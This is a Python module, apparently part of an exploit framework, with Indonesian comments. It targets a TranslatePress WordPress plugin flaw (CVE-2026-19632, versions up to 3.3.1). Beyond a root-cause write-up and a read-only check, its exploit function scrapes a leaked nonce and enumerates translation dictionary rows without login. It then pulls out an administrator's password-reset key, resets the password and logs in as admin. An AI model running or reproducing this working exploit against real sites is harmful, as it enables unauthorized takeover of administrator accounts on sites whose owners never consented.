#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TranslatePress — modul MEGAPACK.

CVE-2026-19632 (<= 3.3.1) — unauth sensitive information exposure via
    trp_get_translations_regular (lookup dictionary by id) -> admin takeover
    [lab-verified: kunci reset password admin bocor -> reset -> login admin]

ROOT CAUSE (source 3.3.1 vs 3.3.9):
    class-translate-press.php:361
        add_action( 'wp_ajax_nopriv_trp_get_translations_regular',
                    $this->editor_api_regular_strings, 'get_translations' );
    Endpoint ini dapat dipanggil TANPA LOGIN. check_ajax_referer( 'get_translations',
    'security' ) tidak menghalangi karena nonce-nya bocor di front-end:
        class-translation-render.php:2257
            'gettranslationsnonceregular' => $nonces['gettranslationsnonceregular'],
        class-translation-manager.php:341
            'gettranslationsnonceregular' => wp_create_nonce( 'get_translations' ),
    Halaman berbahasa sekunder (atau ?trp-edit-translation=preview) mencetak nonce itu
    ke inline script -> dapat dibaca pengunjung tanpa login.

    get_translations() menerima 'string_ids' (JSON) lalu memanggil
    get_string_rows( $id_array, $original_array, $language ) yang melakukan
        SELECT id, original, translated, status, block_type, original_id
          FROM <prefix>trp_dictionary_<lang>
         WHERE original IN (...) OR id IN (...)
    -> attacker meng-enumerasi SELURUH baris dictionary lewat id.

    Dictionary menyimpan setiap string yang pernah dilihat auto-save, TERMASUK
    URL reset password yang dibentuk WordPress:
        /wp-login.php?action=rp&key=<KEY PLAINTEXT>&login=admin
    -> kunci reset password administrator terbaca -> reset -> login admin.

FIX 3.3.9:
    1. Hook wp_ajax_nopriv_trp_get_translations_regular dihapus.
    2. get_translations() + get_translation_for_strings() menambahkan
       `if ( ! current_user_can( apply_filters( 'trp_translating_capability',
       'manage_options' ) ) ) { wp_die(); }`.
    3. Endpoint front-end baru get_translations_domchanges() (nopriv) hanya melakukan
       lookup by ORIGINALS — tidak pernah by id — dan memanggil
       trp_sort_dictionary_by_original( ..., null ) sehingga id baris dictionary tidak
       ikut dalam respons. Komentar fix-nya eksplisit: "never internal URLs, which is
       how the reset link would arrive".

CHAIN (lab-verified, 8104):
    1. GET /?trp-edit-translation=preview  ->  ambil gettranslationsnonceregular
    2. POST /wp-admin/admin-ajax.php
         action=trp_get_translations_regular  security=<nonce>
         language=<lang sekunder>  string_ids=[<id>]  originals=[]
       -> {"translated":"http://.../wp-login.php?action=rp&key=<KEY>&login=admin"}
    3. GET URL itu -> form reset password, POST resetpass dengan rp_key=<KEY>
    4. Login dengan password baru -> sesi administrator.

PRASYARAT: TP aktif, >=2 bahasa (admin memakai locale bahasa sekunder supaya halaman
reset tercatat ke dictionary), auto-save string aktif (default).

BATAS JUJUR: enumerasi id memerlukan penebakan rentang id; dictionary pada situs
nyata biasanya berisi ribuan baris, sehingga pencarian URL reset masuk akal tetapi
tidak terjamin menemukannya dalam satu request. Modul ini menandai status `PWN`
hanya bila kunci reset benar-benar ditemukan dan login berhasil; selain itu
melaporkan `VULN` dengan jumlah baris yang diekspos sebagai bukti.
"""
from __future__ import annotations

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)

SLUG = "translatepress-multilingual"
ASSET = "translatepress-multilingual/index.php"
V_MAX = (3, 3, 1)

AJAX = "/wp-admin/admin-ajax.php"
RESET_RE = re.compile(
    r"wp-login\.php\?action=rp[^\"'&]*&(?:amp;)?key=([A-Za-z0-9]+)(?:&(?:amp;)?login=([A-Za-z0-9_.-]+))?",
    re.I)


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _languages(h, base: str):
    """Ambil daftar bahasa dari data front-end TranslatePress (tanpa login)."""
    langs = []
    # urutan preferensi: trp_language_to_query (bahasa sekunder yang dipakai
    # script dynamic translation) DULU, baru bahasa lain sebagai fallback.
    for u in (base + "/?trp-edit-translation=preview", base + "/"):
        r = h.get(u)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        m = re.search(r'"trp_language_to_query"\s*:\s*"([^"]+)"', body)
        if m and m.group(1) and m.group(1) not in langs:
            langs.append(m.group(1))
        m3 = re.search(r'"trp_original_language"\s*:\s*"([^"]+)"', body)
        if m3 and m3.group(1) and m3.group(1) not in langs:
            langs.append(m3.group(1))
        m2 = re.search(r'"trp_current_language"\s*:\s*"([^"]+)"', body)
        if m2 and m2.group(1) and m2.group(1) not in langs:
            langs.append(m2.group(1))
        if langs:
            break
    return langs


def _nonce(h, base: str):
    """Baca nonce 'get_translations' dari data front-end (unauth)."""
    for u in (base + "/?trp-edit-translation=preview", base + "/"):
        r = h.get(u)
        if r is None or r.status_code != 200:
            continue
        m = re.search(r'gettranslationsnonceregular"\s*:\s*"([a-f0-9]{6,})"', r.text or "")
        if not m:
            m = re.search(r"gettranslationsnonceregular['\"]?\s*[:=]\s*['\"]([a-f0-9]{6,})", r.text or "")
        if m:
            return m.group(1)
    return None


def _fetch_ids(h, base: str, nonce: str, language: str, ids):
    """Panggil endpoint vuln untuk daftar id; kembalikan list dict hasil."""
    data = {
        "action": "trp_get_translations_regular",
        "security": nonce,
        "language": language,
        "string_ids": json.dumps(list(ids)),
        "originals": json.dumps([]),
    }
    r = h.post(base + AJAX, data=data)
    if r is None or r.status_code != 200:
        return []
    try:
        arr = r.json()
    except Exception:
        return []
    return arr if isinstance(arr, list) else []


def _extract_reset(entry):
    """Ambil (url, key, login) dari satu entri respons bila memuat URL reset."""
    try:
        ta = entry.get("translationsArray") or {}
        for _lang, row in ta.items():
            for field in ("translated", "editedTranslation", "original"):
                val = row.get(field) or entry.get(field) or ""
                m = RESET_RE.search(str(val))
                if m:
                    return str(val), m.group(1), (m.group(2) or "admin")
    except Exception:
        pass
    for field in ("original", "translated"):
        m = RESET_RE.search(str(entry.get(field) or ""))
        if m:
            return str(entry.get(field) or ""), m.group(1), (m.group(2) or "admin")
    return None


def _do_reset(h, base: str, url: str, key: str, login: str, newpass: str):
    """Jalankan reset password memakai key yang dicuri. True bila login berhasil."""
    # 1) buka halaman reset (meng-set cookie rp)
    h.get(url)
    # 2) submit form reset
    h.post(base + "/wp-login.php?action=resetpass",
           data={"rp_key": key, "rp_login": login,
                 "pass1": newpass, "pass2": newpass,
                 "wp-submit": "Save Password"},
           headers={"Referer": url})
    # 3) login dengan password baru
    h.post(base + "/wp-login.php",
           data={"log": login, "pwd": newpass, "wp-submit": "Log In",
                 "redirect_to": base + "/wp-admin/", "testcookie": "1"},
           headers={"Referer": base + "/wp-login.php"})
    if not any("wordpress_logged_in" in c.name for c in h.s.cookies):
        return False, "reset dijalankan tetapi sesi tidak terpasang"
    r = h.get(base + "/wp-admin/")
    who = ""
    if r is not None:
        m = re.search(r"Howdy,\s*([A-Za-z0-9._@-]+)", r.text or "")
        if m:
            who = m.group(1)
    return True, "login sebagai '%s' setelah reset password" % (who or login)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    base = t.url
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "translatepress-multilingual tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "translatepress ada, versi tidak terbaca", ""
    vstr = _vstr(ver)
    if not ver_le(ver, V_MAX):
        return ST_CLEAN, ("translatepress %s sudah dipatch (3.3.9: nopriv "
                          "trp_get_translations_regular dihapus)" % vstr), ""
    nonce = _nonce(h, base)
    if not nonce:
        return ST_INFO, ("translatepress %s <= 3.3.1, tetapi nonce front-end tidak "
                         "terbaca (mungkin < 2 bahasa atau endpoint tidak dirender)" % vstr), ""
    langs = _languages(h, base)

    # ORACLE NYATA: panggil endpoint nopriv dengan id yang aman (READ saja).
    # Versi + keberadaan nonce BUKAN bukti; yang membuktikan adalah endpoint
    # benar-benar menjawab tanpa autentikasi. Aksi ini hanya membaca terjemahan,
    # tidak mengubah apa pun.
    lang = (langs[0] if langs else "en_US")
    got = _fetch_ids(h, base, nonce, lang, [1])
    if got:
        detail = ("translatepress %s <= 3.3.1: endpoint nopriv "
                  "trp_get_translations_regular menjawab tanpa login "
                  "(bahasa: %s; %d entri)" % (vstr, ", ".join(langs) or "?", len(got)))
        return ST_INFO, detail, f"nonce={nonce} lang={lang} entri={len(got)}"
    return (ST_INFO,
            "translatepress %s <= 3.3.1 (versi rentan, nonce terbaca) tetapi "
            "endpoint nopriv tidak menjawab — tidak terbukti" % vstr,
            f"nonce={nonce} lang={lang}")


def exploit(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, ASSET):
        return ST_CLEAN, "translatepress-multilingual tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if ver and not ver_le(ver, V_MAX):
        return ST_CLEAN, "translatepress %s sudah dipatch (3.3.9)" % _vstr(ver), ""
    nonce = _nonce(h, base)
    if not nonce:
        return ST_ERR, "nonce 'get_translations' tidak ditemukan di front-end", ""
    langs = _languages(h, base)
    # bahasa target: language_to_query (bahasa sekunder) — di situ dictionary reset ada
    language = langs[0] if langs else ""
    if not language:
        return ST_SKIP, "tidak dapat menentukan bahasa target", ""

    # Rentang id: scan dari id TINGGI ke rendah supaya baris terbaru (URL reset
    # paling segar, umumnya belum terpakai) ditemukan lebih dulu. Beberapa kunci
    # reset bisa ada sekaligus; kunci lama sudah single-use/tidak valid.
    batch = 25
    max_id = 320
    newpass = "Tp" + rand(6) + "!2345X"
    total_rows = 0
    candidates = []
    for hi in range(max_id, 0, -batch):
        lo = max(1, hi - batch + 1)
        ids = list(range(hi, lo - 1, -1))
        arr = _fetch_ids(h, base, nonce, language, ids)
        if not arr:
            continue
        total_rows += len(arr)
        for entry in arr:
            hit = _extract_reset(entry)
            if hit:
                candidates.append(hit)
        if candidates:
            break

    # coba setiap kandidat (dari yang paling baru) sampai lolos reset+login
    for url, key, login in candidates[:6]:
        ok, detail = _do_reset(h, base, url, key, login, newpass)
        if ok:
            return ST_PWN, ("kunci reset password '%s' bocor dari dictionary "
                            "terjemahan (unauth, lookup by id) -> %s"
                            % (login, detail)), \
                           "rows=%d key_len=%d candidates=%d" % (total_rows, len(key), len(candidates))

    if candidates:
        url, key, login = candidates[0]
        return ST_VULN, ("kunci reset password '%s' bocor (key_len=%d) tetapi reset "
                         "gagal (kunci mungkin sudah terpakai / kedaluwarsa)"
                         % (login, len(key))), url

    return ST_VULN, ("endpoint nopriv dapat dipanggil tanpa login dan mengekspos %d "
                     "baris dictionary (lookup by id), tetapi URL reset password tidak "
                     "ditemukan dalam rentang id 1-%d (bahasa: %s)"
                     % (total_rows, max_id, language)), "rows=%d lang=%s" % (total_rows, language)


def register_all():
    register(CveModule(
        cve="CVE-2026-19632", cluster="wordpress",
        title="TranslatePress <= 3.3.1 unauth admin takeover via translation "
              "dictionary disclosure (trp_get_translations_regular nopriv)",
        vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-200",
        product="TranslatePress - Translate Multilingual sites",
        versions_affected="<= 3.3.1",
        status="verified", check=check, exploit=exploit,
        notes="Endpoint wp_ajax_nopriv_trp_get_translations_regular dapat dipanggil "
              "tanpa login; nonce 'get_translations' bocor di front-end "
              "(gettranslationsnonceregular pada halaman bahasa sekunder / "
              "?trp-edit-translation=preview). Handler menerima string_ids dan "
              "memanggil get_string_rows() -> attacker meng-enumerasi SELURUH baris "
              "dictionary lewat id. Dictionary memuat URL reset password yang "
              "dibentuk WordPress (/wp-login.php?action=rp&key=<PLAINTEXT>&login=admin) "
              "-> kunci reset administrator bocor -> reset -> login admin. "
              "Lab-verified end-to-end. Fix 3.3.9: nopriv dihapus + capability gate + "
              "endpoint front-end baru get_translations_domchanges() yang hanya "
              "lookup by originals dan tidak mengembalikan id.",
    ))


register_all()
